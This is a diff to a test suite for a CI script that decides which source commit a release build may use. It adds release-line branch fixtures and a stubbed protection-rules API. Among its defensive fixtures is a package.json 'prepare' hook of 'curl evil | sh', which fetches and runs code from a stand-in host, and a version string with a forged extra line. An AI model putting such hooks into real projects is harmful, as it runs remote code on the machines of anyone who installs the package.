@@ -203,12 +203,37 @@ describe("the source commit the run builds", () => {
     git(cwd, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", file);
     return git(cwd, "rev-parse", "HEAD");
   };
-  const resolveWith = (requested, githubSha) => {
+  // What the rules API reports for a release line: protected unless a case says otherwise.
+  const protectedRules = JSON.stringify([
+    { type: "pull_request" },
+    { type: "non_fast_forward" },
+    { type: "deletion" },
+    {
+      type: "required_status_checks",
+      parameters: {
+        strict_required_status_checks_policy: true,
+        required_status_checks: [
+          { context: "check (node 24)", integration_id: 15368 },
+          { context: "release line check", integration_id: 15368 },
+        ],
+      },
+    },
+  ]);
+  const resolveWith = (requested, githubSha, rules = protectedRules) => {
     const out = join(work, `out-${Math.random().toString(16).slice(2)}`);
     writeFileSync(out, "");
     execFileSync("bash", ["-c", script], {
       cwd: clone,
-      env: { ...process.env, REQUESTED: requested, GITHUB_SHA: githubSha, GITHUB_OUTPUT: out },
+      env: {
+        ...process.env,
+        PATH: `${join(work, "bin")}:${process.env.PATH}`,
+        RULES: rules,
+        GITHUB_REPOSITORY: "o/r",
+        RUNNER_TEMP: work,
+        REQUESTED: requested,
+        GITHUB_SHA: githubSha,
+        GITHUB_OUTPUT: out,
+      },
       stdio: "pipe",
     });
     return readFileSync(out, "utf8");
@@ -226,6 +251,14 @@ describe("the source commit the run builds", () => {
 
   beforeEach(() => {
     work = mkdtempSync(join(tmpdir(), "orca-resolve-"));
+    mkdirSync(join(work, "bin"));
+    writeFileSync(
+      join(work, "bin", "gh"),
+      '#!/bin/sh\ncase "$*" in *rules/branches*) printf "%s" "$RULES";; *) exit 1;; esac\n',
+      {
+        mode: 0o755,
+      },
+    );
     origin = join(work, "origin");
     mkdirSync(origin);
     git(origin, "init", "-q", "-b", "main");
@@ -235,6 +268,7 @@ describe("the source commit the run builds", () => {
       ["packages/app/package.json", '{"name":"app"}\n'],
       ["packages/app/electron-builder.yml", "appId: orca\n"],
       ["packages/app/scripts/stage-native.js", "// v1\n"],
+      ["tools/release-lane.js", readFileSync(new URL("../release-lane.js", import.meta.url), "utf8")],
     ])
       commit(origin, file, content);
     commit(origin, "tools/packaged-windows/build-bundle.js", "v1\n");
@@ -260,6 +294,22 @@ describe("the source commit the run builds", () => {
     branchWith("patch", "patches/x.patch", "diff\n");
     branchWith("badVersion", "package.json", rootManifest("1.0.0\n- forged line"));
     branchWith("rootScripts", "package.json", rootManifest("0.6.0", { prepare: "curl evil | sh" }));
+    // Release lines (docs/RELEASING.md): release/0.6 diverges from main in application
+    // source. A 0.6.x patch on it is checked against the line's head, not main's.
+    git(origin, "checkout", "-qb", "release/0.6", `${main}~1`);
+    commit(origin, "packages/app/src/fix.ts", "export const fix = 1;\n");
+    commits.linePatch = commit(origin, "package.json", rootManifest("0.6.1"));
+    commit(origin, "CHANGELOG.md", "0.6.1 notes\n");
+    commits.lineNotes = git(origin, "rev-parse", "HEAD");
+    git(origin, "checkout", "-qb", "line-moved", commits.linePatch);
+    git(origin, "checkout", "-q", "release/0.6");
+    commits.lineHead = commit(origin, "packages/app/src/later.ts", "export const later = 1;\n");
+    // A 0.6.x patch that only main holds: never released from main.
+    git(origin, "checkout", "-qb", "patchOnMain", main);
+    commits.patchOnMain = commit(origin, "package.json", rootManifest("0.6.2"));
+    // A 0.7.x version on the 0.6 line: never compared with release/0.6.
+    git(origin, "checkout", "-qb", "wrongLine", commits.linePatch);
+    commits.wrongLine = commit(origin, "package.json", rootManifest("0.7.1"));
     git(origin, "checkout", "-q", "--detach", main);
     commits.unbranched = commit(origin, "dangling", "d\n");
     git(origin, "checkout", "-q", "--detach", main);
@@ -286,6 +336,43 @@ describe("the source commit the run builds", () => {
 
   it("accepts a branch that is not a descendant of main when its tree otherwise matches", () => {
     expect(resolveWith(commits.sideways, main)).toBe(`sha=${commits.sideways}\n`);
+  });
+
+  it("accepts a patch on its own release line, checked against the line's head", () => {
+    expect(resolveWith(commits.lineHead, main)).toBe(`sha=${commits.lineHead}\n`);
+  });
+
+  it.each([
+    [
+      "a patch the line has since moved past in source",
+      () => commits.linePatch,
+      protectedRules,
+      /differs from release\/0\.6/,
+    ],
+    [
+      "the line's notes commit once the line moved on",
+      () => commits.lineNotes,
+      protectedRules,
+      /differs from release\/0\.6/,
+    ],
+    [
+      "a version whose own line does not exist",
+      () => commits.wrongLine,
+      protectedRules,
+      /release\/0\.7, the only branch/,
+    ],
+    ["a patch on a line that is not protected", () => commits.lineHead, "[]", /not protected as a release line/],
+    ["a patch that is only on main", () => commits.patchOnMain, protectedRules, /is not on release\/0\.6/],
+  ])("refuses %s", (_, requested, rules, message) => {
+    let failure;
+    try {
+      resolveWith(requested(), main, rules);
+    } catch (error) {
+      failure = error;
+    }
+    expect(failure?.status).toBe(1);
+    expect(String(failure.stdout)).toMatch(/^::error::/m);
+    expect(String(failure.stdout)).toMatch(message);
   });
 
   it("accepts changes to docs, workflow files and test files", () => {
